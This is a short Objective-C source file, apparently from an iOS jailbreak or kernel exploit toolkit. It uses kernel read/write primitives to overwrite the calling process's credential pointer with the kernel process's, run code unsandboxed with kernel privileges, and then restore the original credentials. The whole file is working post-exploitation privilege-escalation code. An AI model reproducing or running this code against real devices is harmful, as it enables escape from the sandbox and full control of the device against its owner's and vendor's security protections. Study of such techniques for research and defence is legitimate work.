#import "util.h"
#import "krw.h"
#import "offsets.h"
#import "proc.h"

uint64_t proc_get_ucred(uint64_t proc_ptr) {
  return kread64(proc_ptr + off_p_ucred);
}

void proc_set_ucred(uint64_t proc_ptr, uint64_t ucred_ptr) {
  kwrite64(proc_ptr + off_p_ucred, ucred_ptr);
}

void run_unsandboxed(void (^block)(void)) {
  uint64_t selfProc = proc_of_pid(getpid()); // self_proc();
  uint64_t selfUcred = proc_get_ucred(selfProc);

  uint64_t kernelProc = proc_of_pid(0);
  uint64_t kernelUcred = proc_get_ucred(kernelProc);

  proc_set_ucred(selfProc, kernelUcred);
  block();
  proc_set_ucred(selfProc, selfUcred);
}